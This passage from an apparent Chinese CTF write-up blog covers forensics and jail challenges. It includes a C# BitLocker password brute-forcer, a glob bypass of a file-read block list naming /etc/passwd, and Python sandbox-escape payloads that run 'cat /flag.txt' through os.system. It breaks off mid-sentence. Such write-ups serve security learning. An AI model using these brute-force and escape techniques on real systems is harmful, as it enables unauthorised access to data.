src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613575327067.617108192f6593f49433ee3f5a52e4572eb0cf1f.png"></p><p>使用这个密码解密加密的 Pastebin 可以得到如下内容。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;secret_hidden_0nn_th3_1ntern3t&#125;</span><br></pre></td></tr></table></figure><p>使用 VeraCrypt 加载 secret 文件，使用同一个密码挂载磁盘。打开挂载的磁盘可以得到 foryou.txt，其中包含第三个 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;y0u_got_n1ce_Skills!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="s3cr3t"><a href="#s3cr3t" class="headerlink" title="s3cr3t"></a>s3cr3t</h3><p>使用 FTK Imager 挂载 trollcat.E01 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613668516356.24078abed460bbe151dd06156b6983e655f5ddcc.png"></p><p>在 <code>X:\[root]\Favorites\drive</code> 下可以找到 topsecret.zip 文件。其中包含一个需要解锁 bitlocker 的虚拟磁盘文件。写个脚本使用 GitHub 上的一万个常用密码爆破 BitLocker 密码。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> ORMi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BLCSTest</span>&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">uint</span> FVE_E_FAILED_AUTHENTICATION = <span class="number">0x80310027</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> LOCKED = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> UNLOCKED = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">uint</span> FVE_E_FAILED_AUTHENTICATION = <span class="number">0x80310027</span>;</span><br><span class="line">            WMIHelper helper = <span class="keyword">new</span> WMIHelper(<span class="string">&quot;Root\\CIMV2\\Security\\MicrosoftVolumeEncryption&quot;</span>);</span><br><span class="line">            List&lt;EncryptableVolume&gt; volumes = helper.Query&lt;EncryptableVolume&gt;().ToList();</span><br><span class="line">            EncryptableVolume encryptedVolume = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            Parallel.ForEach(volumes, (volume) =&gt; &#123;</span><br><span class="line">                <span class="keyword">var</span> lockStatus = volume.GetLockStatus();</span><br><span class="line">                <span class="keyword">if</span>(lockStatus.Status == LOCKED)&#123;</span><br><span class="line">                    encryptedVolume = volume;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;[*] Found Drive &#123;0&#125;&quot;</span>,encryptedVolume.PersistentVolumeID);</span><br><span class="line">            List&lt;<span class="built_in">string</span>&gt; passwords = File.ReadAllLines(<span class="string">@&quot;X:\path\to\10-million-password-list-top-10000.txt&quot;</span>,Encoding.Default).ToList();</span><br><span class="line">            <span class="built_in">bool</span> stopWatchStop = <span class="literal">false</span>;</span><br><span class="line">            TimeSpan timeSpan = TimeSpan.Zero;</span><br><span class="line">            Stopwatch stopwatch = <span class="keyword">new</span> Stopwatch();</span><br><span class="line">            stopwatch.Start();</span><br><span class="line">            Parallel.ForEach(passwords, (password) =&gt; &#123;</span><br><span class="line">                encryptedVolume.UnlockWithPassphrase(password);</span><br><span class="line">                <span class="keyword">if</span>(encryptedVolume.GetLockStatus().Status == UNLOCKED)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!stopWatchStop)&#123;</span><br><span class="line">                        stopWatchStop = <span class="literal">true</span>;</span><br><span class="line">                        stopwatch.Stop();</span><br><span class="line">                        timeSpan = stopwatch.Elapsed;</span><br><span class="line">                    &#125;</span><br><span class="line">                    Console.WriteLine(<span class="string">&quot;[*] Unlocked in &#123;0&#125;&quot;</span>,timeSpan.TotalMilliseconds);</span><br><span class="line">                    Environment.Exit(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="meta">WMIClass(<span class="meta-string">&quot;Win32_EncryptableVolume&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EncryptableVolume</span> : <span class="title">WMIInstance</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> DeviceID &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> PersistentVolumeID &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> DriveLetter &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> ProtectionStatus &#123;<span class="keyword">get</span>; <span class="keyword">set</span>;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> VolumeVersion <span class="title">GetVersion</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;VolumeVersion&gt;(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">VolumeVersion</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Version&#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> LockStatus <span class="title">GetLockStatus</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;LockStatus&gt;(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">LockStatus</span>&#123;</span><br><span class="line">        [<span class="meta">WMIProperty(<span class="meta-string">&quot;LockStatus&quot;</span>)</span>]</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Status&#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnlockStatus <span class="title">UnlockWithPassphrase</span>(<span class="params"><span class="built_in">string</span> passphrase</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> WMIMethod.ExecuteMethod&lt;UnlockStatus&gt;(<span class="keyword">this</span>, <span class="keyword">new</span> &#123; Passphrase = passphrase &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UnlockStatus</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">uint</span> ReturnValue &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挂载磁盘后运行脚本可以得到如下运行结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Found Drive &#123;84D081EF-90E6-49AE-9F72-35E226441E8E&#125;</span><br><span class="line">[*] Unlocked in 52768.7111</span><br></pre></td></tr></table></figure><p>脚本在 52768.7111ms 后解锁了磁盘。使用 FTK Imager 访问挂载后的磁盘，可以在回收站中找到 flag 文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613674404449.a1aa264254ce518305ed87a6b3a72e10fab91775.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;finallly_y0u_f0und_mY_s3ret!!!&#125;</span><br></pre></td></tr></table></figure><h3 id="the-sus-agent"><a href="#the-sus-agent" class="headerlink" title="the_sus_agent"></a>the_sus_agent</h3><p>Wireshark 分析流量包，在 TCP 流 0 处可以发现 welcome.jpg。在 TCP 流 88 处可以发现名为 secret 的字符串。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613709979133.76a8b3e9ab2300d3ceed2b9fb74e0eaf4e18ef3a.png"></p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613709988121.6bc22631070cc65e84ce6ec0f2ca18be66927848.png"></p><p>将得到的字符串 <code>aWhvcGV5b3VkaWRub3R0cmllZHRvYnJ1dGVmb3JjZWl0</code> base64 解码一次可得 <code>ihopeyoudidnottriedtobruteforceit</code>。将图片提取出来后上传到 aperisolve 使用这个字符串作为密码分析，可以得到以下结果。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613710082744.d3c74333af2671c37f1389ea73d226fd6aa5d832.png"></p><p>将文件下载下来解压即可得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;this_challenge_was_easy_right???&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0x41414141 CTF 2021</title>
      <link href="/zh-CN/posts/2bef66b8.html"/>
      <url>/zh-CN/posts/2bef66b8.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x414141"><a href="#0x414141" class="headerlink" title="0x414141"></a>0x414141</h3><p>根据题目描述定向到 <a href="https://github.com/offshift-protocol/promo/commit/f2112c46cafb86e3225901b011e4ea71858901a3">GitHub Repo</a> 可以获取到一个 .pyc 文件。将其使用 反编译可得如下代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">secret = <span class="string">&#x27;https://google.com&#x27;</span></span><br><span class="line">cipher2 = [<span class="string">b&#x27;NDE=&#x27;</span>, <span class="string">b&#x27;NTM=&#x27;</span>, <span class="string">b&#x27;NTM=&#x27;</span>, <span class="string">b&#x27;NDk=&#x27;</span>, <span class="string">b&#x27;NTA=&#x27;</span>, <span class="string">b&#x27;MTIz&#x27;</span>, <span class="string">b&#x27;MTEw&#x27;</span>, <span class="string">b&#x27;MTEw&#x27;</span>, <span class="string">b&#x27;MzI=&#x27;</span>, <span class="string">b&#x27;NTE=&#x27;</span>, <span class="string">b&#x27;MzQ=&#x27;</span>, <span class="string">b&#x27;NDE=&#x27;</span>, <span class="string">b&#x27;NDA=&#x27;</span>, <span class="string">b&#x27;NTU=&#x27;</span>, <span class="string">b&#x27;MzY=&#x27;</span>, <span class="string">b&#x27;MTEx&#x27;</span>, <span class="string">b&#x27;NDA=&#x27;</span>, <span class="string">b&#x27;NTA=&#x27;</span>, <span class="string">b&#x27;MTEw&#x27;</span>, <span class="string">b&#x27;NDY=&#x27;</span>, </span><br><span class="line"><span class="string">b&#x27;MTI=&#x27;</span>, <span class="string">b&#x27;NDU=&#x27;</span>, <span class="string">b&#x27;MTE2&#x27;</span>, <span class="string">b&#x27;MTIw&#x27;</span>]</span><br><span class="line">cipher1 = [base64.b64encode(<span class="built_in">str</span>(<span class="built_in">ord</span>(i) ^ <span class="number">65</span>).encode()) <span class="keyword">for</span> i <span class="keyword">in</span> secret]</span><br></pre></td></tr></table></figure><p>将 cipher2 按照相同的方法解密出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text2 = [<span class="built_in">chr</span>(<span class="built_in">int</span>(base64.b64decode(i).decode()) ^ <span class="number">65</span>) <span class="keyword">for</span> i <span class="keyword">in</span> cipher2]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(text2))</span><br></pre></td></tr></table></figure><p>得到了一个网址 <a href="https://archive.is/oMl59%E3%80%82%E5%AE%9A%E5%90%91%E5%88%B0%E8%BF%99%E4%B8%AA%E7%BD%91%E5%9D%80%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E5%A6%82%E4%B8%8B%E4%BF%A1%E6%81%AF%E3%80%82">https://archive.is/oMl59。定向到这个网址可以发现如下信息。</a></p><p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613549609737.70744b59b4d0ce46aaf1de4184590ef4a188b7ff.png"></p><p>下载文件得到 smashing.pdf，使用 010 editor 打开文件后可以发现很多 0x41 的字节，猜测是文件被按位异或过。尝试将其复原可以得到原本的 pdf 文件。binwalk 一下 pdf 文件可以发现其中包含一个含有 flag.txt 的压缩文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550142916.8d7f8612e81a995ade9caca0d9cca92fcbdcfdbe.png"></p><p><code>binwalk -e</code> 将压缩包分离出来后发现解压需要密码，因为没有发现其他信息，故尝试一波爆破。使用 GitHub 上的一万常用密码密码表可以爆破得出压缩包密码为 passwd。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550305651.fc3dad003b1d9d6bb7cb30e39c6443c2e1f07302.png"></p><p>解压压缩包可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1t_b33n_A_l0ng_w@y8742&#125;</span><br></pre></td></tr></table></figure><h4 id="使用-CyberChef-分离文件"><a href="#使用-CyberChef-分离文件" class="headerlink" title="使用 CyberChef 分离文件"></a>使用 CyberChef 分离文件</h4><p>看了大佬的 WriteUp 发现使用 CyberChef 的 Extract Files 功能也可以分离出文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550427938.10d6cd23c8abf181c12e08028f40bc9a57427e56.png"></p><h3 id="file-reader"><a href="#file-reader" class="headerlink" title="file_reader"></a>file_reader</h3><p>附件给出的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"></span><br><span class="line">blocked = [<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;/flag.txt&quot;</span>, <span class="string">&quot;/proc/&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_path</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blocked:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> file_path:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;you aren&#x27;t allowed to read that file&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        path = glob.glob(file_path)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;file doesn&#x27;t exist&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(path, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">user_input = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(read_file(user_input))</span><br></pre></td></tr></table></figure><p>稍加分析可知题意是要我们绕过过滤读到 flag.txt。使用 <code>/flag.???</code> 即可成功绕过读到 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613550861385.a4beb06472f081a20b49a9b20930d049a5ba6f0e.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;oof_1t_g0t_expanded_93929&#125;</span><br></pre></td></tr></table></figure><h3 id="pyjail"><a href="#pyjail" class="headerlink" title="pyjail"></a>pyjail</h3><p>附件给出的代码如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules, version</span><br><span class="line"></span><br><span class="line">banned = <span class="string">&quot;import|chr|os|sys|system|builtin|exec|eval|subprocess|pty|popen|read|get_data&quot;</span></span><br><span class="line">search_func = <span class="keyword">lambda</span> word: re.<span class="built_in">compile</span>(<span class="string">r&quot;\b(&#123;0&#125;)\b&quot;</span>.<span class="built_in">format</span>(word), flags=re.IGNORECASE).search</span><br><span class="line"></span><br><span class="line">modules.clear()</span><br><span class="line"><span class="keyword">del</span> modules</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;version&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;What would you like to say?&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        text = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>).lower()</span><br><span class="line">        check = search_func(banned)(<span class="string">&#x27;&#x27;</span>.join(text.split(<span class="string">&quot;__&quot;</span>)))</span><br><span class="line">        <span class="keyword">if</span> check:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Nope, we ain&#x27;t letting you use <span class="subst">&#123;check.group(<span class="number">0</span>)&#125;</span>!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^(_?[A-Za-z0-9])*[A-Za-z](_?[A-Za-z0-9])*$&quot;</span>, text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You aren&#x27;t getting through that easily, come on.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">exec</span>(text, &#123;<span class="string">&#x27;globals&#x27;</span>: <span class="built_in">globals</span>(), <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;&#125;, &#123;<span class="string">&#x27;print&#x27;</span>:<span class="built_in">print</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>可以得出除了过滤了一些常用的 token 之外用了一个很奇怪的正则，基本上匹配的是下划线开头的内容，但是要以下划线开头，所以 <code>print((globals[&#39;__builtins__&#39;]))</code> 还是没有问题。因为有 <code>globals()</code>，所以尝试将其打印出来，发现了 <code>&#39;__builtins__&#39;: &lt;module &#39;builtins&#39; (built-in)&gt;</code>。也就是他表面上把 builtins 禁用了，实际上还是可以访问到。</p><p>既然最后要读到 <code>/flag</code>，那肯定是需要 <code>system(&quot;cat /flag&quot;)</code> 的操作，所以需要引入 os 模块。这里的 <code>__import__</code> 被禁用了，因此可以尝试采用 <code>getattr()</code> 来构造。先尝试导出一下 <code>__import__</code>。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613561032538.d74285f7ce1c021d42ee40c2eb1b12aa12292db2.png"></p><p>可以看到使用 getattr 可以成功地导出。接下来一步步导出到 system 函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]),(<span class="string">&#x27;__impor&#x27;</span> + <span class="string">&#x27;t__&#x27;</span>))(<span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;s&#x27;</span>) <span class="comment">#导出到 __import__.os</span></span><br><span class="line">(<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>(((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]),(<span class="string">&#x27;__impor&#x27;</span> + <span class="string">&#x27;t__&#x27;</span>))(<span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;s&#x27;</span>)),(<span class="string">&#x27;syste&#x27;</span> + <span class="string">&#x27;m&#x27;</span>)) <span class="comment">#导出到函数 system</span></span><br></pre></td></tr></table></figure><p>接下来就能执行 shell 了，构造出如下 payload 即可读到 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>(((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]).<span class="built_in">getattr</span>((<span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>]),(<span class="string">&#x27;__impor&#x27;</span> + <span class="string">&#x27;t__&#x27;</span>))(<span class="string">&#x27;o&#x27;</span> + <span class="string">&#x27;s&#x27;</span>)),(<span class="string">&#x27;syste&#x27;</span> + <span class="string">&#x27;m&#x27;</span>))(<span class="string">&#x27;cat /flag.txt&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;l3t&#39;s_try_sc0p1ng_th1s_0ne_2390098&#125;</span><br></pre></td></tr></table></figure><p>在大佬的文章里看到了一种很妙的解法，是通过全局变量覆盖来实现的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">globals</span>[<span class="string">&#x27;banned&#x27;</span>] = <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">globals</span>[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;cat /f*&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="shjail"><a href="#shjail" class="headerlink" title="shjail"></a>shjail</h3><p>附件给出的代码如下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">RED=<span class="string">&#x27;\e[0;31m&#x27;</span></span><br><span class="line">END=<span class="string">&#x27;\e[0m&#x27;</span></span><br><span class="line">GREEN=<span class="string">&#x27;\e[0;32m&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;What would you like to say?&quot;</span></span><br><span class="line"><span class="built_in">read</span> USER_INP</span><br><span class="line">       <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$USER_INP</span>&quot;</span> =~ [<span class="string">&#x27;&amp;&#x27;</span><span class="string">&#x27;$&#x27;</span><span class="string">&#x27;`&#x27;</span><span class="string">&#x27;&gt;&#x27;</span><span class="string">&#x27;&lt;&#x27;</span><span class="string">&#x27;/&#x27;</span><span class="string">&#x27;*&#x27;</span><span class="string">&#x27;?&#x27;</span>txcsbqi] ]]; <span class="keyword">then</span></span><br><span class="line">               <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;RED&#125;</span>Hmmmm, what are you trying to do?<span class="variable">$&#123;END&#125;</span>&quot;</span></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">               OUTPUT=$(<span class="variable">$USER_INP</span>) &amp;&gt;/dev/null</span><br><span class="line">               <span class="built_in">echo</span> -e <span class="string">&quot;<span class="variable">$&#123;GREEN&#125;</span>The command has been executed. Let&#x27;s go again!<span class="variable">$&#123;END&#125;</span>&quot;</span></span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span> </span><br></pre></td></tr></table></figure><p>可以发现禁用的单字符有 <code>&grave;&$&gt;&lt;/*?txcsbqi</code>，剩余的单字符有 <code>adefghjklmnopruvwyz</code>。同时只有在指令报错的时候才能有输出。因此要想办法用报错的程序来带出文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/1228a20f-9dbb-4901-92e3-119015392d72/1613563108620.856cc2a1ed08e1582c35e24c0f96486180815350.png"></p><p>看了 WriteUp 之后知道这里可以使用 perl 来带出文件，同时因为 txt 中的 t 字符被禁用了，因此需要使用 bash 的正则表达式。可以尝试使用 open 指令来确定文件是否存在从而确定 flag 的位置。因为这题禁用了 /，所以 flag 应该不在根目录。然而在 bash 的正则中 <code>[a-z]&#123;3&#125;</code> 表示三个连续的前一个 RE 字符，而并不是一般正则的匹配三次。因此需要尝试 <code>open flag.[a-z][a-z][a-z]</code> 来匹配 flag.txt，可以发现指令成功执行且没有报错，对比其他的执行可知此时 flag 位于当前目录下且可能名为 flag.txt。因此最后的 paylaod 可以是 